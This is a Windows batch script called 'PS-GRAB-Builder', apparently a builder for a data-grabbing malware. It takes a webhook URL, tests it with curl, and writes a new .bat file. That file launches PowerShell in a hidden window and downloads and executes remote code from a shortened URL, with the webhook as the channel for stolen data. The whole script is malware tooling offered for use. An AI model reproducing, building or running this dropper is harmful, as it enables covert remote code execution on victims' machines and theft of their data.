

mode 140, 10
@echo off
color 06


Title PS-GRAB-Builder


DEL /F /Q PS-GRAB_Builded.bat

cls

:start


Echo Set the webhook
SET /P variable= WebHook:
cls
Echo Set the name of the file (without .bat)
SET /P name= Name: 
Title PS-GRAB-Builder: %variable%

IF "%variable%"=="" GOTO start2
cls
echo -----------------------------------
Echo WebHook = %variable%
Echo Name = %name%.bat
echo -----------------------------------
echo.
SET WEBHOOK_URL=%variable%
curl -H "Content-Type: application/json" -d "{\"content\": \"The WebHook is working   -   Ps-Grabber\"}" %WEBHOOK_URL%

echo (Normaly you get a message from your WebHook)

SET hook2='%variable%'

echo @echo off >> %name%.bat
echo powershell -windowstyle hidden $webHookUrl=%hook2%;iex((iwr shorturl.at/biVZ5).content) >> %name%.bat


pause >nul
exit
 

:start2
echo You need to set a webhook
pause >nul
cls
goto start 
